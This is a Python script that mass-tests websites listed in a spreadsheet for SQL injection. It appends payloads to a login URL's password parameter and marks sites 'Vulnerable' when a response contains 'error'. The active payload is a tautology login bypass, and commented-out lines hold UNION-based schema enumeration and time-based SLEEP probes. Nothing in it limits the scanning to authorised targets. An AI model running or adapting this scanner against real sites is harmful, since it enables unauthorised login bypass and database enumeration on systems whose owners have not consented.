import pandas as pd
import requests

# Read the Excel file containing the list of websites
df = pd.read_excel('Website.xlsx')
#mdf = df[11:31]
# List of payloads to try
payloads = [
    "' OR '1'='1'--",
     #"' OR '1'='1' /*",
   # "1' UNION SELECT null, database(), null--",
    #"1' UNION SELECT table_name, column_name, null FROM information_schema.columns--",
    #"1'; SELECT 1/0; --",
    #"1'; SELECT * FROM nonexistent_table; --",
    #"1' AND 1=1--",
    #"1' AND 1=2--",
    #"1' AND SLEEP(5)--"
    
]

# List to store the results
results = []

# Iterate over the rows of the DataFrame
for index, row in df.iterrows():
    website = row['Website']
    status = 'Not Vulnerable'

    # Iterate over the columns 1 to 10 or up to the number of columns in the row
    for col in range(10, min(22, len(row))):
        value = str(row[col])

        # Iterate over the payloads
        for payload in payloads:
            url = f'{website}?username=admin&password={value}{payload}'
            response = requests.get(url)
            if 'error' in response.text.lower():
                status = 'Vulnerable'
                break  # No need to test other payloads if vulnerability is found

    results.append({'Website': website, 'Status': status})

# Create a new DataFrame from the results
results_df = pd.DataFrame(results)

# Write the results to a new Excel file
results_df.to_excel('results.xlsx', index=False)
